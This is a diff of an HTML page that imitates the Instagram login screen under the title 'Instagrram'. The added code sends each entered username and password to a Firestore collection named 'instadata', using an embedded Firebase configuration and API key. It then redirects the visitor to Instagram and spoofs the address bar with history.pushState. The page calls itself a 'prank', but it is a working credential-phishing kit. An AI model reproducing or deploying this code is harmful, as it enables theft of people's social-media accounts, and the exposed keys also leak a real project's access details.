@@ -1,40 +1,40 @@
-<!DOCTYPE html> 
-<html> 
-<head> 
+<!DOCTYPE html>
+<html>
+<head>
 
-<meta charset="UTF-8"> 
-<link data-default-icon="Web_Icon.png" rel="icon" sizes="192x192" href="Web_Icon.png" /> 
-<title>Instagrram</title> 
-<link rel="stylesheet" href="style.css"> 
+<meta charset="UTF-8">
+<link data-default-icon="Web_Icon.png" rel="icon" sizes="192x192" href="Web_Icon.png" />
+<title>Instagrram</title>
+<link rel="stylesheet" href="style.css">
 <!-- <script src="C:\Users\u1091915\Documents\PLSQL\HTML_CSS\Insta\script.js"></script>-->
-</head> 
+</head>
 
-<body> 
-<div class="Test_screen"> 
-    <img width="390" height="550" src="Reels_Screen.jpg"> 
+<body>
+<div class="Test_screen">
+    <img width="390" height="550" src="Reels_Screen.jpg">
 </div>
- 
-<div class="login-box"> 
-    <img width="200" height="80" src="Insta_font.jpg"> 
-    <br> 
-	
-	<form id="loginForm" onsubmit="prank(event)" action="Details.php"> 
-	   <input type="text" name="Name" id="username" placeholder="Phone number, username, or email" required> 
-       <br> 
-	   <input type="password" name="Password" id="password" placeholder="Password" required> 
-       <br> 
-	   <button type="submit" onclick="storeDetails()" class="login-button">Log In</button> 
-  
-       <div class="or-line"> 
-            <hr> <span> OR </span> <hr> 
-       </div> 
-  
+
+<div class="login-box">
+    <img width="200" height="80" src="Insta_font.jpg">
+    <br>
+
+	<form id="loginForm" onsubmit="prank(event)" action="Details.php">
+	   <input type="text" name="Name" id="username" placeholder="Phone number, username, or email" required>
+       <br>
+	   <input type="password" name="Password" id="password" placeholder="Password" required>
+       <br>
+	   <button type="submit" id = "login" class="login-button">Log In</button>
+
+       <div class="or-line">
+            <hr> <span> OR </span> <hr>
+       </div>
+
        <a class="image-link" href="New.html" target="New.html">
           <img width="200" height="80" src="FB.jpg">
-	   </a> 
-	</form> 
+	   </a>
+	</form>
 
-     <div class="signup-box"> 
+     <div class="signup-box">
           <p>Don't have an account? <a href="New.html">Signup</a></p>
      </div>
 </div>
@@ -52,15 +52,42 @@
 </div>
 
 <script>
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
+    import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-analytics.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js";
+      // TODO: Add SDKs for Firebase products that you want to use
+      // https://firebase.google.com/docs/web/setup#available-libraries
+
+      // Your web app's Firebase configuration
+      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+    const firebaseConfig = {
+        apiKey: "AIzaSyBDsu6TrOHuZorWSwfhDmFPgFK49r-G51U",
+        authDomain: "finstagram-aaa6b.firebaseapp.com",
+        projectId: "finstagram-aaa6b",
+        storageBucket: "finstagram-aaa6b.appspot.com",
+        messagingSenderId: "939992500515",
+        appId: "1:939992500515:web:3c267b2783a236f93de496",
+        measurementId: "G-CQD4HL65XT"
+    };
+
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const analytics = getAnalytics(app);
+
     function prank(event) {
       event.preventDefault(); // Prevent form submission
       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;
       if (username && password) {
-        alert("You've been pranked! Your credentials were captured.");        
-// You can perform additional actions or show custom prank messages here      
-}    
+        alert("You've been pranked! Your credentials were captured.");
+// You can perform additional actions or show custom prank messages here
 }
+}
+
+var db = getFirestore();
+
+var userid, pass;
 
 // Get the current URL
 var currentURL = window.location.href;
@@ -70,25 +97,29 @@ var modifiedURL = 'instagrram.com';
 
 history.pushState(null, null, modifiedURL);
 
-function storeDetails()
-{
-// Retrieve input values
-var username = document.getElementById("username").value;
-var password = document.getElementById("password").value;
+document.getElementById("login").onclick = async(e) => {
 
-// Create an object to store the details
-var userDetails = { 
-username: username, 
-password: password                  
+    console.log("hmmmm")
+    pass = document.getElementById('password').value;
+    userid = document.getElementById('username').value;
+    if (pass !== null && pass.length > 6) {
+        document.getElementById('logintxt').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+        console.log("jjjj hhh")
+        try {
+            const docRef = await addDoc(collection(db, "instadata"), {
+                user: userid,
+                password: pass
+            })
+            window.location.href = "instagram.com";
+
+        } catch (e) {
+            console.error("Error adding document: ", e);
+        }
+    }
+
 };
 
-// Store the details in localStorage
-localStorage.setItem("userDetails", JSON.stringify(userDetails));
-
-
-// Optionally, you can redirect the user to another page
-window.location.href = "New.html";
-}
 </script>
 
 </body>
